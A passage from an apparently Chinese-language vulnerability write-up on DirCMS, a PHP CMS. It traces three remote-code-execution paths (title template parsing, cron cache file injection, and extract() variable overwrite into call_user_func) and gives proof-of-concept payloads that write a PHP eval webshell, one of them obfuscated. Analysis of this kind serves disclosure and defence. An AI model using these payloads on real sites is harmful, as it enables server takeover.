class="n">decode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">evil</span><span class="mf">.</span><span class="n">php</span><span class="p">,</span><span class="nc">PD9waHAgJHFlQWY9Y3JlYXRlX2Z1bmN0aW9uKHN0cl9yb3QxMygnJCcpLmJhc2U2NF9kZWNvZGUoJ2N3PT0nKS5zdHJfcm90MTMoJ2InKS5jaHIoNTAxLTM5MikuYmFzZTY0X2RlY29kZSgnWlE9PScpLGNocigweDEzMC0weGNiKS5jaHIoMHhmZDg0LzB4MjI2KS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuY2hyKDA1NjI1MC8wMTEyMSkuY2hyKDA1MDY2NC8wMTEwNSkuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoMHgyYjAtMHgyNDMpLmJhc2U2NF9kZWNvZGUoJ1pRPT0nKS5jaHIoMHg2ZjI2LzB4MmI2KS5jaHIoMDQ3NTEwLzA1MzApKTskcWVBZihiYXNlNjRfZGVjb2RlKCdPRGM1TicuJ2pjM08wJy4nQmxka0YnLidzS0NSZicuJycuc3RyX3JvdDEzKCdIJykuY2hyKDAxNzMxMzIvMDE2MjIpLmNocig1MDQ0NS84ODUpLmNocig3MDItNjE4KS5iYXNlNjRfZGVjb2RlKCdWZz09JykuJycuJycuY2hyKDU2MDcwLzgwMSkuc3RyX3JvdDEzKCdnJykuY2hyKDMwNjE4LzM3OCkuY2hyKDB4M2Q2LTB4MzcyKS5zdHJfcm90MTMoJ2EnKS4nJy4nUklWSGwnLidFUkYwcCcuJ096STJNJy4nemt3TXonLidFNycuJycpKTs</span><span class="o">/</span><span class="nc">Pg</span><span class="o">==</span><span class="p">)}</span>
</code></pre></div></div>

<h3 id="前台代码执行模板解析导致-rce">前台代码执行（模板解析导致 RCE）</h3>
<p>这个前台的 RCE 与上面的后台 RCE sink 点一致，都是利用 php55_replace_function 函数。</p>

<p>搜索 php55_replace_function 的调用点，主要出现在 dircms/Fcms/Library/Seo.php 和 dircms/Fcms/Library/Router.php 两个文件中。</p>

<p>Seo 类中的三个函数都有调用：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dircms/Fcms/Library/Seo.php
    - Seo 类
        - category 函数
        - search 函数
        - show 函数
</code></pre></div></div>
<p>其中，search 函数用于前端查询窗口，上面的后台 RCE 就是需要通过这个函数来触发，但此处的 payload 需要依赖后台数据修改。</p>

<p>show 函数用于文章的展示，查看某一篇文章时就会调用，部分代码如下：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">show</span><span class="p">(</span><span class="nv">$mod</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$page</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="mf">...</span>
    <span class="nv">$meta_title</span> <span class="o">=</span> <span class="nv">$mod</span><span class="p">[</span><span class="s1">'site'</span><span class="p">][</span><span class="no">SITE_ID</span><span class="p">][</span><span class="s1">'show_title'</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$mod</span><span class="p">[</span><span class="s1">'site'</span><span class="p">][</span><span class="no">SITE_ID</span><span class="p">][</span><span class="s1">'show_title'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">'['</span><span class="mf">.</span><span class="nf">dr_lang</span><span class="p">(</span><span class="s1">'第%s页'</span><span class="p">,</span> <span class="s1">'{page}'</span><span class="p">)</span><span class="mf">.</span><span class="s1">'{join}]{title}{join}{catpname}{join}{modulename}{join}{SITE_NAME}'</span><span class="p">;</span>
    <span class="nv">$meta_title</span> <span class="o">=</span> <span class="nv">$page</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="o">?</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'['</span><span class="p">,</span> <span class="s1">']'</span><span class="p">),</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$meta_title</span><span class="p">)</span> <span class="o">:</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/\[.+\]/U'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$meta_title</span><span class="p">);</span>

    <span class="nv">$rep</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">\php5replace</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'#{([A-Z_]+)}#U'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$rep</span><span class="p">,</span> <span class="s1">'php55_replace_var'</span><span class="p">),</span> <span class="nv">$meta_title</span><span class="p">);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'#{([a-z_0-9]+)}#U'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$rep</span><span class="p">,</span> <span class="s1">'php55_replace_data'</span><span class="p">),</span> <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'#{([a-z_0-9]+)\((.*)\)}#Ui'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$rep</span><span class="p">,</span> <span class="s1">'php55_replace_function'</span><span class="p">),</span> <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'join'</span><span class="p">]</span><span class="mf">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'join'</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'join'</span><span class="p">],</span> <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nf">dr_clearhtml</span><span class="p">(</span><span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]));</span>
    <span class="mf">...</span>
<span class="p">}</span>
</code></pre></div></div>
<p>可以看到其中用到了 <code class="language-plaintext highlighter-rouge">{join}]{title}{join}{catpname}{join}{modulename}{join}{SITE_NAME}</code> 这个模板，也就是说，在经过 php55_replace_data 函数时，就会使用文章实际的标题来替换 <code class="language-plaintext highlighter-rouge">{title}</code>。</p>

<p>但需要注意的是，这段代码调用完 php55_replace_data 之后，继续调用 php55_replace_function，如果我们将 title 填充为 <code class="language-plaintext highlighter-rouge">{file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,base64_content)}</code>，就可以进入 php55_replace_function 的调用。</p>

<p>因此，只需要创建一篇文章，将标题填充为上述的 payload 即可，如果站点开启了注册，我们就可以直接创建一个普通用户，然后创建一篇文章就可以 RCE。</p>

<p>poc:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg==)}
</code></pre></div></div>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230808041749.png" alt="20230808041749" /></p>

<p>创建完之后在前台查看该文章就可以触发。</p>

<h3 id="后台代码注入缓存文件利用">后台代码注入（缓存文件利用）</h3>
<p>参考这篇文章 <a href="https://xz.aliyun.com/t/11457">某CMS漏洞总结 - 先知社区</a>，该漏洞出现在迅睿 CMS 框架版本 v4.3.3～v4.5.0，DirCMS 中没有明确标识版本，但根据代码逻辑判断属于该版本区间。</p>

<p>dircms/Core/Controllers/Admin/Cron.php 中的 add 函数会将用户输入写入缓存文件，并且每次访问时对缓存文件进行包含，由此造成代码注入，add 函数的代码如下：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">add</span><span class="p">()</span> <span class="p">{</span>

        <span class="nv">$json</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="no">WRITEPATH</span><span class="mf">.</span><span class="s1">'config/cron.php'</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">require</span> <span class="no">WRITEPATH</span><span class="mf">.</span><span class="s1">'config/cron.php'</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$json</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="no">IS_AJAX_POST</span><span class="p">)</span> <span class="p">{</span>

            <span class="nv">$post</span> <span class="o">=</span> <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">post</span><span class="p">(</span><span class="s1">'data'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

            <span class="nb">file_put_contents</span><span class="p">(</span><span class="no">WRITEPATH</span><span class="mf">.</span><span class="s1">'config/cron.php'</span><span class="p">,</span>
                <span class="s1">'&lt;?php defined(\'FCPATH\') OR exit(\'No direct script access allowed\');'</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="mf">.</span><span class="s1">' $json=\''</span><span class="mf">.</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$post</span><span class="p">)</span><span class="mf">.</span><span class="s1">'\';'</span><span class="p">);</span>

            <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">system_log</span><span class="p">(</span><span class="s1">'设置自定义任务类型'</span><span class="p">);</span>

            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_json</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nf">dr_lang</span><span class="p">(</span><span class="s1">'操作成功'</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">assign</span><span class="p">([</span>
            <span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
        <span class="p">]);</span>
        <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">display</span><span class="p">(</span><span class="s1">'cron_add.html'</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>触发 add 函数的调用需要进入管理员后台 -&gt; 应用 -&gt; 应用插件 -&gt; 任务队列。</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230808225520.png" alt="20230808225520" /></p>

<p>点击保存可以提交 post 报文，data 参数经过 json_encode 最终会写入 cache/config/cron.php</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">';file_put_contents(implode(base64_decode('</span><span class="nc">Lw</span><span class="o">==</span><span class="s1">'),['</span><span class="n">php</span><span class="o">:</span><span class="s1">','','</span><span class="n">filter</span><span class="s1">','</span><span class="n">write</span><span class="o">=</span><span class="n">convert</span><span class="mf">.</span><span class="n">base64</span><span class="o">-</span><span class="n">decode</span><span class="s1">','</span><span class="n">resource</span><span class="o">=</span><span class="n">evil</span><span class="mf">.</span><span class="n">php</span><span class="s1">']),'</span><span class="nc">PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg</span><span class="o">==</span><span class="s1">');return;$a='</span>
</code></pre></div></div>

<p>最终写入 cache/config/cron.php 文件内容如下：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">defined</span><span class="p">(</span><span class="s1">'FCPATH'</span><span class="p">)</span> <span class="k">OR</span> <span class="k">exit</span><span class="p">(</span><span class="s1">'No direct script access allowed'</span><span class="p">);</span>
 <span class="nv">$json</span><span class="o">=</span><span class="s1">'{"1":{"name":"'</span><span class="p">;</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">'Lw=='</span><span class="p">),[</span><span class="s1">'php:'</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="s1">'filter'</span><span class="p">,</span><span class="s1">'write=convert.base64-decode'</span><span class="p">,</span><span class="s1">'resource=evil.php'</span><span class="p">]),</span><span class="s1">'PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg=='</span><span class="p">);</span><span class="k">return</span><span class="p">;</span><span class="nv">$a</span><span class="o">=</span><span class="s1">'"}}'</span><span class="p">;</span>
</code></pre></div></div>

<p>也参考这篇文章 <a href="https://xz.aliyun.com/t/11457">某CMS漏洞总结 - 先知社区</a> 中的 poc:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">isform</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">csrf_test_name</span><span class="o">=</span><span class="mi">3318</span><span class="n">a4fabdf4ea654734315a4d508a5f</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">name</span><span class="p">]</span><span class="o">=&amp;</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">code</span><span class="p">]</span><span class="o">=</span><span class="p">[</span><span class="s1">';file_put_contents('</span><span class="n">webshell</span><span class="mf">.</span><span class="n">php</span><span class="s1">',htmlspecialchars_decode('</span><span class="o">&lt;</span><span class="s1">').'</span><span class="o">?</span><span class="n">php</span> <span class="k">eval</span><span class="s1">'.base64_decode('</span><span class="no">KA</span><span class="o">==</span><span class="s1">').'</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'.base64_decode('</span><span class="nc">Ig</span><span class="o">==</span><span class="s1">').'</span><span class="n">password</span><span class="s1">'.base64_decode('</span><span class="nc">Ig</span><span class="o">==</span><span class="s1">').'</span><span class="p">]</span><span class="s1">'.base64_decode('</span><span class="no">KQ</span><span class="o">==</span><span class="s1">').'</span><span class="p">;</span><span class="o">?</span><span class="s1">'.htmlspecialchars_decode('</span><span class="o">&gt;</span><span class="s1">'));return;'</span><span class="p">]</span>
</code></pre></div></div>

<h3 id="前台代码执行变量覆盖导致模板变量可控">前台代码执行（变量覆盖导致模板变量可控）</h3>

<p>dircms/Fcms/Core/View.php 中的 list_tag 函数中存在这样的代码：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// list 标签解析</span>
<span class="k">public</span> <span class="k">function</span> <span class="n">list_tag</span><span class="p">(</span><span class="nv">$_params</span><span class="p">)</span> <span class="p">{</span>
    <span class="mf">...</span>
    <span class="k">switch</span> <span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">'action'</span><span class="p">])</span> <span class="p">{</span>

        <span class="k">case</span> <span class="s1">'function'</span><span class="o">:</span> <span class="c1">//执行函数</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">'return'</span><span class="p">],</span> <span class="s1">'name参数不存在'</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">'return'</span><span class="p">],</span> <span class="s1">'函数['</span><span class="mf">.</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span><span class="mf">.</span><span class="s1">']未定义'</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="nv">$name</span> <span class="o">=</span> <span class="s1">'function-'</span><span class="mf">.</span><span class="nb">md5</span><span class="p">(</span><span class="nf">dr_array2string</span><span class="p">(</span><span class="nv">$param</span><span class="p">));</span>
            <span class="nv">$cache</span> <span class="o">=</span> <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'cache'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$cache</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$rt</span> <span class="o">=</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'name'</span><span class="p">],</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">'param'</span><span class="p">]);</span>
                <span class="nv">$cache</span> <span class="o">=</span> <span class="p">[</span>
                    <span class="nv">$rt</span>
                <span class="p">];</span>
                <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'cache'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">,</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">'cache'</span><span class="p">]);</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">'return'</span><span class="p">],</span> <span class="nv">$cache</span><span class="p">,</span> <span class="s1">''</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
</code></pre></div></div>
<p>当 action 为字符串 function 时，会调用 <code class="language-plaintext highlighter-rouge">call_user_func($param['name'], $param['param'])</code> 执行函数。如果函数名与函数参数可控，则可以造成任意代码执行。</p>

<p>list_tag 函数在大量的模板文件中被调用，例如：cache/template/template_pc_default_home_api_list_data.html.cache.php。该文件是 template/pc/default/home/api/list_data.html 经过解析之后生成的 php 缓存文件。</p>

<p>当需要使用 list_data.html 这个前端文件时，就会将 cache/template/template_pc_default_home_api_list_data.html.cache.php 这个缓存文件包含进来。</p>

<p>该缓存文件的部分内容如下所示：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nv">$list_return</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">list_tag</span><span class="p">(</span><span class="s2">"action=module module=news catid=</span><span class="nv">$catid</span><span class="s2"> page=1 cache=300"</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$list_return</span><span class="p">)</span> <span class="nb">extract</span><span class="p">(</span><span class="nv">$list_return</span><span class="p">,</span> <span class="no">EXTR_OVERWRITE</span><span class="p">);</span> <span class="nv">$count</span><span class="o">=</span><span class="nf">dr_count</span><span class="p">(</span><span class="nv">$return</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$return</span><span class="p">))</span> <span class="p">{</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$return</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$is_first</span><span class="o">=</span><span class="nv">$key</span><span class="o">==</span><span class="mi">0</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$is_last</span><span class="o">=</span><span class="nv">$count</span><span class="o">==</span><span class="nv">$key</span><span class="o">+</span><span class="mi">1</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span> <span class="cp">?&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ajax-load-con content excerpt-one"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"content-box posts-image-box"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"posts-default-title"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"post-entry-categories"</span><span class="nt">&gt;</span>
</code></pre></div></div>
<p>其中会调用 list_tag 函数，且传入参数 <code class="language-plaintext highlighter-rouge">action=module module=news catid=$catid page=1 cache=300</code>。可以看到参数是通过空格进行分割的键值对，list_tag 函数在进行处理时，会将键值对保存在 <code class="language-plaintext highlighter-rouge">$system</code> 这个变量中：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$params</span> <span class="k">as</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
        <span class="mf">...</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="nv">$var</span><span class="p">]))</span> <span class="p">{</span> <span class="c1">// 系统参数，只能出现一次，不能添加修饰符</span>
            <span class="nv">$system</span><span class="p">[</span><span class="nv">$var</span><span class="p">]</span> <span class="o">=</span> <span class="nf">dr_safe_replace</span><span class="p">(</span><span class="nv">$val</span><span class="p">);</span>
        <span class="p">}</span>
</code></pre></div></div>
<p>例如第一个参数 action： <code class="language-plaintext highlighter-rouge">$system['action'] = dr_safe_replace('module')</code></p>

<p>想要进入 call_user_func，就需要 action 的值为 function。但在内置的所有模板中，没有模板使用到了 <code class="language-plaintext highlighter-rouge">action=function</code>。</p>

<p><strong>但需要注意的是</strong>，list_tag 在调用时 <code class="language-plaintext highlighter-rouge">$this-&gt;list_tag("action=module module=news catid=$catid page=1 cache=300");</code>，使用到了一个 <code class="language-plaintext highlighter-rouge">$catid</code> 变量。由于这个变量被直接拼接进来，假如构造</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$catid</span> <span class="o">=</span> <span class="s2">" action=function name=phpinfo param0=-1"</span>
</code></pre></div></div>
<p>最终传入 list_tag 的参数就会变成：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">list_tag</span><span class="p">(</span><span class="s2">"action=module module=news catid= action=function name=phpinfo param0=-1 page=1 cache=300"</span><span class="p">);</span>
</code></pre></div></div>
<p>action 参数被设置了两次，但最终会都被设置为后者的值，这样也就达到了目的。</p>

<p><code class="language-plaintext highlighter-rouge">$catid</code> 在哪被赋值呢？模板文件实际上是在 dircms/Fcms/Core/View.php 中的 display 函数中使用 include 包含进来的，<strong>在这个 include 的前方，正好调用了一次 extract 函数。</strong></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">display</span><span class="p">(</span><span class="nv">$_name</span><span class="p">,</span> <span class="nv">$_dir</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>

		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">[</span><span class="s1">'get'</span><span class="p">]))</span> <span class="p">{</span>
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">[</span><span class="s1">'get'</span><span class="p">]</span> <span class="o">=</span> <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">xss_clean</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
		<span class="p">}</span>
        <span class="mf">...</span>

        <span class="nb">extract</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">,</span> <span class="no">EXTR_PREFIX_SAME</span><span class="p">,</span> <span class="s1">'data'</span><span class="p">);</span>

        <span class="mf">...</span>
        <span class="k">include</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">load_view_file</span><span class="p">(</span><span class="nv">$_view_file</span><span class="p">);</span>
        <span class="mf">...</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>extract 函数可以造成变量覆盖，如果 <code class="language-plaintext highlighter-rouge">$this-&gt;_options</code>可控的话，就可以对 <code class="language-plaintext highlighter-rouge">$catid</code> 赋值。向上溯源可以发现根多地方都有调用 display 函数，但只有 dircms/Core/Controllers/Api/Api.php 中的 template 函数最方便利用：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">template</span><span class="p">()</span> <span class="p">{</span>

    <span class="nv">$file</span> <span class="o">=</span> <span class="nf">dr_safe_filename</span><span class="p">(</span><span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'name'</span><span class="p">));</span>
    <span class="nv">$module</span> <span class="o">=</span> <span class="nf">dr_safe_filename</span><span class="p">(</span><span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'module'</span><span class="p">));</span>

    <span class="nv">$data</span> <span class="o">=</span> <span class="p">[</span>
        <span class="s1">'file'</span> <span class="o">=&gt;</span> <span class="nv">$file</span><span class="p">,</span>
        <span class="s1">'module'</span> <span class="o">=&gt;</span> <span class="nv">$module</span><span class="p">,</span>
    <span class="p">];</span>

    <span class="mf">...</span>
        <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">assign</span><span class="p">(</span><span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="kc">true</span><span class="p">));</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">display</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
        <span class="nv">$html</span> <span class="o">=</span> <span class="nb">ob_get_contents</span><span class="p">();</span>
        <span class="nb">ob_clean</span><span class="p">();</span>
    <span class="mf">...</span>
<span class="p">}</span>
</code></pre></div></div>
<p>直接调用 <code class="language-plaintext highlighter-rouge">\Phpcmf\Service::V()-&gt;assign</code> 函数并传入所有 GET 请求参数。<code class="language-plaintext highlighter-rouge">\Phpcmf\Service::V()-&gt;assign</code> 函数就是用于给 option 成员变量赋值的，如下所示：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">assign</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">FALSE</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$key</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>由此一来从 GET 请求参数中传入即可。poc 如下：</p>
